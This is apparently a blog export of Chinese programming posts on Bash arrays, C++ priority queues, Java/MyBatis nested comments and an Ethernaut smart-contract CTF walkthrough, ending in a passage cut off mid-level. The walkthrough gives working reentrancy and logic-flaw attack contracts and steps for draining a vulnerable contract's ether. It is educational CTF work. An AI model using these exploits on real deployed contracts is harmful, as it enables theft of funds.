<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array1&#x3D;()</span><br><span class="line">array2&#x3D;(item1 item2 item3)</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="访问数组："><a href="#访问数组：" class="headerlink" title="访问数组："></a>访问数组：</h2><p>一般格式是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;arrayName[index]&#125;</span></span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;array2[1]&#125;</span><br></pre></td></tr></table></figure>

<p>数组的下标跟C语言一样是从0开始的，所以上面输出的是<code>item2</code></p>
<p>也可以访问全部元素，下面两种方法是等价的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;array2[*]&#125;</span><br><span class="line">echo $&#123;array2[@]&#125;</span><br></pre></td></tr></table></figure>

<h2 id="追加元素"><a href="#追加元素" class="headerlink" title="追加元素"></a>追加元素</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array2[50]&#x3D;&quot;abc&quot;</span><br><span class="line">array2[30]&#x3D;&quot;def&quot;</span><br></pre></td></tr></table></figure>

<p>然后让我们看一下现在的数组是怎么样子的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">array1&#x3D;()</span><br><span class="line">array2&#x3D;(item1 item2 item3)</span><br><span class="line">array2[50]&#x3D;&quot;abc&quot;</span><br><span class="line">array2[30]&#x3D;&quot;def&quot;</span><br><span class="line">echo $&#123;array2[*]&#125;</span><br><span class="line">------------------------------</span><br><span class="line">yalexin@yalexin-PC:&#x2F;usr&#x2F;study$ .&#x2F;array.sh</span><br><span class="line">item1 item2 item3 def abc</span><br></pre></td></tr></table></figure>

<p>可以发现，追加元素时候下标不需要是连续的，当我们输出全部元素的时候，元素是空值的会自动省略。</p>
<h2 id="获取长度："><a href="#获取长度：" class="headerlink" title="获取长度："></a>获取长度：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len&#x3D;$&#123;#array2[*]&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len&#x3D;$&#123;#array2[@]&#125;</span><br></pre></td></tr></table></figure>

<p>也可以获取数组元素的长度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">indexLen&#x3D;$&#123;#array2[50]&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>indexLen</code>指的是元素的字符个数。</p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>使用C++的优先队列时自定义比较函数</title>
    <url>/2021/04/10/%E4%BD%BF%E7%94%A8C-%E7%9A%84%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%E6%97%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>在<code>C++</code>中，优先队列是一种底层使用堆实现的数据结构，位于队首的元素总是目前所有元素中最优的；</p>
<a id="more"></a>

<p><strong>所在头文件：</strong><code>#include &lt;queue&gt;</code></p>
<p><strong>定义方式：</strong><code>priority_queue&lt;Type, Container, Functional&gt;</code><br>而<code>C++</code>也提供了两种简单的比较方式，即大顶堆小顶堆</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 小顶堆</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt;greaterQue;</span><br><span class="line"><span class="comment">// 大顶堆</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, less&lt;<span class="keyword">int</span>&gt; &gt;lessQue;</span><br><span class="line">greaterQue.push(<span class="number">1</span>);</span><br><span class="line">greaterQue.push(<span class="number">5</span>);</span><br><span class="line">greaterQue.push(<span class="number">2</span>);</span><br><span class="line">lessQue.push(<span class="number">1</span>);</span><br><span class="line">lessQue.push(<span class="number">5</span>);</span><br><span class="line">lessQue.push(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// lessQue  = [5, 1, 2]</span></span><br><span class="line"><span class="comment">// greaterQue = [1, 5, 2]</span></span><br></pre></td></tr></table></figure>

<p>当我们的队列元素不是普通数据类型的时候，我们的比较方式有可能很复杂，我们需要自行定义比较函数，例如当我们需要对结构体进行维护优先队列的时候，一般有两种方法：</p>
<ul>
<li>在结构体中重载运算符</li>
<li>结构体外部定义方法，使用该方法进行构造队列</li>
</ul>
<p>例如，我有一个学生结构体，想要构建一个队首的学生是年龄最小的，当年龄都相同的时候，名字按照字典顺序小的排在前面：</p>
<p><strong>法一：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    Stu(<span class="keyword">int</span> age1, <span class="built_in">string</span> name1)&#123;</span><br><span class="line">        age = age1;</span><br><span class="line">        name = name1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (<span class="keyword">const</span> Stu &amp;s1) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s1.age == age)<span class="keyword">return</span> name &gt; s1.name;</span><br><span class="line">        <span class="keyword">return</span> age &gt; s1.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1;</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"yalexin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"axin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"aaaaa"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"bbbbb"</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!que1.empty())&#123;</span><br><span class="line">        Stu top = que1.top();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"age ： "</span> &lt;&lt; top.age &lt;&lt; <span class="string">", name : "</span> &lt;&lt; top.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        que1.pop(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于上面的代码，控制台输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age ： 11, name : axin</span><br><span class="line">age ： 11, name : yalexin</span><br><span class="line">age ： 12, name : aaaaa</span><br><span class="line">age ： 12, name : bbbbb</span><br></pre></td></tr></table></figure>

<p>注意当你打算使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1</span><br></pre></td></tr></table></figure>

<p>的时候，结构体中需要重载的运算符是<code>&gt;</code>，相应的，你打算使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1</span><br></pre></td></tr></table></figure>

<p>的时候，你的结构体中就应该重载<code>&lt;</code></p>
<p><strong>法二：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    Stu(<span class="keyword">int</span> age1, <span class="built_in">string</span> name1)&#123;</span><br><span class="line">        age = age1;</span><br><span class="line">        name = name1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyCmp</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> Stu &amp;a, <span class="keyword">const</span> Stu &amp;b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a.age == b.age) <span class="keyword">return</span> a.name &gt; b.name;</span><br><span class="line">        <span class="keyword">return</span> a.age &gt; b.age;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, MyCmp &gt;que1;</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"yalexin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"axin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"aaaaa"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"bbbbb"</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!que1.empty())&#123;</span><br><span class="line">        Stu top = que1.top();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"age ： "</span> &lt;&lt; top.age &lt;&lt; <span class="string">", name : "</span> &lt;&lt; top.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        que1.pop(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两种方法的结果都一样。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>二级评论展示的实现方法</title>
    <url>/2021/03/01/%E4%BA%8C%E7%BA%A7%E8%AF%84%E8%AE%BA%E5%B1%95%E7%A4%BA%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通常的博客评论展示有一级评论、二级评论、多级评论，不同的展示方法给用户的体验不一样。</p>
<a id="more"></a>

<h2 id="一级评论"><a href="#一级评论" class="headerlink" title="一级评论"></a>一级评论</h2><p>顾名思义，就是所有评论（回复）是同级关系，这样子是设计简单，查询迅速，表可以设计成：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段说明</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>主键</td>
</tr>
<tr>
<td>blog_id</td>
<td>所属博客的id</td>
</tr>
<tr>
<td>content</td>
<td>评论内容</td>
</tr>
</tbody></table>
<p>查询某一篇文章的评论时候可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t_comment WHERE blog_id &#x3D; 99;</span><br></pre></td></tr></table></figure>

<p>是不是非常的简单！</p>
<p>但是这样子用户体验就太差了，对于回复的评论，用户根本无法建立起回复的桥梁。</p>
<p><img src="https://qiniu.yalexin.top/%E4%B8%80%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
<h2 id="多级评论"><a href="#多级评论" class="headerlink" title="多级评论"></a>多级评论</h2><p>简单来说就是层层嵌套，每一条评论具有严格的父子关系。表格可以设计成：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段说明</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>主键</td>
</tr>
<tr>
<td>blog_id</td>
<td>所属博客的id</td>
</tr>
<tr>
<td>content</td>
<td>评论内容</td>
</tr>
<tr>
<td>parent_comment_id</td>
<td>父级评论id，顶层评论为-1</td>
</tr>
</tbody></table>
<p><code>JavaBean</code>设计：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">	<span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> Long blogId;</span><br><span class="line">    <span class="keyword">private</span> Long parentCommentId;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; replyComments;</span><br><span class="line">    <span class="comment">// 省略set和get方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查询的时候，对于每一条顶层评论，拿到顶层评论的<code>id</code>后，将该<code>id</code>作为参数，可以查出二级评论，将二级评论的<code>id</code>作为参数，可以查出三级评论……</p>
<p>借助<code>Mybatis</code>，查询语句可以写成：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"top.yalexin.rblog.mapper.CommentMapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findTopCommentsByParentIdAndBlogId"</span> <span class="attr">resultMap</span>=<span class="string">"topComment"</span>&gt;</span></span><br><span class="line">        select * from t_comment as cmt where cmt.parent_comment_id=#&#123;parentId&#125; and cmt.blog_id=#&#123;blogId&#125; </span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"topComment"</span> <span class="attr">type</span>=<span class="string">"Comment"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">property</span>=<span class="string">"id"</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"content"</span> <span class="attr">column</span>=<span class="string">"content"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"blogId"</span> <span class="attr">column</span>=<span class="string">"blog_id"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"parentCommentId"</span> <span class="attr">column</span>=<span class="string">"parent_comment_id"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 这一步使得JDBC递归进行查询 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"replyComments"</span> <span class="attr">select</span>=<span class="string">"findTopCommentsByParentIdAndBlogId"</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">column</span>=<span class="string">"&#123;blogId=blog_id,parentId=id&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>查询结果类似于：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">        id: 1,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: [</span><br><span class="line">            &#123;</span><br><span class="line">                id: 2,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 1,</span><br><span class="line">                replyComments:[</span><br><span class="line">                    &#123;</span><br><span class="line">                        id: 3,</span><br><span class="line">                        content: 'hello',</span><br><span class="line">                        parent_comment_id: 2,</span><br><span class="line">                        replyComments:[]</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: 4,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: []</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>类似的效果：</p>
<p><img src="https://qiniu.yalexin.top/%E5%A4%9A%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
<p>虽然看上去层级关系清晰明了，但是当回复树深度很大的时候，页面将变得十分难看，所以该方式也很少使用。</p>
<h2 id="二级评论"><a href="#二级评论" class="headerlink" title="二级评论"></a>二级评论</h2><p>该方式先把每一个顶级评论展示，然后每一个顶级评论下的所有评论都处理成二级评论</p>
<p>该方式查询过程也很简单，<strong>查询语句和多级评论的方式一样</strong>，需要改变的是查询结束后的处理：</p>
<p>如果将每一个顶级评论和该评论下的子孙评论看成一棵树的话，为每一个顶级评论创建一个replyCmts容器，那么我们可以递归进行，遇到叶节点时，将叶节点的父节点的replyComments设为空，同时将叶节点添加到replyCmts容器中，此时先前的父节点又变成了叶节点，此时就可以递归返回，直至处理完所有节点，下面是代码实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">getTopCommentsByBlogId</span><span class="params">(Long blogId)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (blogId == <span class="keyword">null</span> || blogId &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    List&lt;Comment&gt; rawCmts = commentMapper.findTopCommentsByParentIdAndBlogId((<span class="keyword">long</span>) -<span class="number">1</span>, blogId);</span><br><span class="line">    <span class="keyword">return</span> getParent(rawCmts);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;Comment&gt; <span class="title">getParent</span><span class="params">(List&lt;Comment&gt; rawComments)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 对于每一个顶级回复</span></span><br><span class="line">    <span class="keyword">for</span> (Comment topComment : rawComments) &#123;</span><br><span class="line">        <span class="comment">// 将顶级评论的子孙评论归结到一个集合中</span></span><br><span class="line">        LinkedList&lt;Comment&gt; comments = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        List&lt;Comment&gt; replyCmtsByTopCmt = topComment.getReplyComments();</span><br><span class="line">        <span class="keyword">for</span> (Comment replyComment : replyCmtsByTopCmt) &#123;</span><br><span class="line">            handleChild(replyComment, comments);</span><br><span class="line"><span class="comment">//                replyComment.setReplyNickname(topComment.getId().toString());</span></span><br><span class="line">            replyComment.setReplyNickname(topComment.getNickname());</span><br><span class="line">        &#125;</span><br><span class="line">        topComment.setReplyComments(comments);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rawComments;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理二级评论以及子评论</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleChild</span><span class="params">(Comment replyComment, List&lt;Comment&gt; parent)</span> </span>&#123;</span><br><span class="line">    List&lt;Comment&gt; grandchildren = replyComment.getReplyComments();</span><br><span class="line">    replyComment.setReplyComments(<span class="keyword">null</span>);</span><br><span class="line">    parent.add(replyComment);</span><br><span class="line">    <span class="keyword">for</span> (Comment grandChild : grandchildren) &#123;</span><br><span class="line"><span class="comment">//            grandChild.setReplyNickname(replyComment.getId().toString());</span></span><br><span class="line">        grandChild.setReplyNickname(replyComment.getNickname());</span><br><span class="line">        <span class="keyword">if</span> (grandChild.getReplyComments() != <span class="keyword">null</span>) handleChild(grandChild, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查询结果：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">        id: 1,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: [</span><br><span class="line">            &#123;</span><br><span class="line">                id: 2,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 1,</span><br><span class="line">                replyComments:[]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                id: 3,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 2,</span><br><span class="line">                replyComments:[]</span><br><span class="line">			&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: 4,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: []</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>该方式结合了一级评论和多级评论的优点，深得广大开发者的热爱。</p>
<p><img src="https://qiniu.yalexin.top/%E4%BA%8C%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>MySql</tag>
        <tag>java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>【Ethernaut闯关录】中篇</title>
    <url>/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/</url>
    <content><![CDATA[<p>原文再续，书接上回，本文继续闯关，本次我们来学习重入漏洞、Solidity存储布局、ERC20代币标准、delegatecall、交易追踪和字节码等知识。<a id="more"></a></p>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-06&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件：将合约代币都偷走。</p>
<p>考察的是重入漏洞，该漏洞恐怕是智能合约上面最臭名昭著的漏洞了，<code>withdraw</code>函数中，先进行转账(以<code>call</code>的方式)，然后才更新余额，那么如果转账目的方是一个合约账户，在转账过程又会继续调用<code>withdraw</code>函数，则此时<code>balances[msg.sender]</code>来不及更新，则会造成合约的代币被盗取。著名的DAO攻击就是利用了该漏洞。</p>
<p>具体而言，参照下面的合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Target&#123;</span><br><span class="line">     function donate(address _to) external payable ;</span><br><span class="line">     function withdraw(uint _amount) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyAttack &#123;</span><br><span class="line">	address public instance ;</span><br><span class="line">  	constructor(address _instance) payable &#123;</span><br><span class="line">        instance &#x3D; _instance;  </span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; 通过查看可知，Reentrance 合约中有 0.001 ether</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    function donate()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.donate&#123;value: 0.001 ether&#125;(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击流程：我们部署我们的攻击合约（部署的时候传入<code>Reentrance</code>合约地址），同时往攻击合约<code>ReEntrancyAttack</code>中转入0.001 ether，接着调用<code>donate</code>，然后在控制台输入<code>fromWei(await contract.balanceOf(&#39;0x11Ef368C1D3226dce5c53A9880b0DF148Ea3D0a1&#39;))</code>即可发现我们已经放入<code>0.001 ether</code>,此时可以调用我们的<code>attack</code>函数，调用完毕，我们的攻击合约将会得到<code>0.002 ether</code>，即我们不仅拿回了原本放进合约<code>Reentrance</code>中的<code>0.001 ether</code>，还顺带把<code>Reentrance</code>本身有的<code>0.001 ether</code>拿了过来。</p>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">&#x2F;&#x2F; 判断是不是最后一层</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line">    &#x2F;&#x2F; 如果指定层_floor不是最后一层，则移动到该指定层，并继续判断</span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件：将<code>top</code>置为<code>ture</code>。</p>
<p>本题目和<code>solidity</code>特性好像关联不是很大，考察的是逻辑漏洞，我们想要<code>top</code>为真，则<code>if</code>语句的<code>building.isLastFloor(_floor)</code>必须返回<code>false</code>，但是下面的19行处<code>building.isLastFloor(floor)</code>又要求返回<code>true</code>，对相同值返回不同的结果，看上去貌似矛盾，其实，我们可以这样子想想，只要第一次调用<code>isLastFloor</code>返回是<code>false</code>,后面调用再返回<code>true</code>不就行了吗？如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract ElevatorAttack&#123;</span><br><span class="line">    uint public state;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">    	state &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">    &#x2F;&#x2F; 第一次调用</span><br><span class="line">		if (state &#x3D;&#x3D; 0)&#123;</span><br><span class="line">			state &#x3D; state + 1;</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else&#123;</span><br><span class="line">		&#x2F;&#x2F; 第二次及以后</span><br><span class="line">			return true;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(block.timestamp);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;</span><br><span class="line">      .,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,</span><br><span class="line">      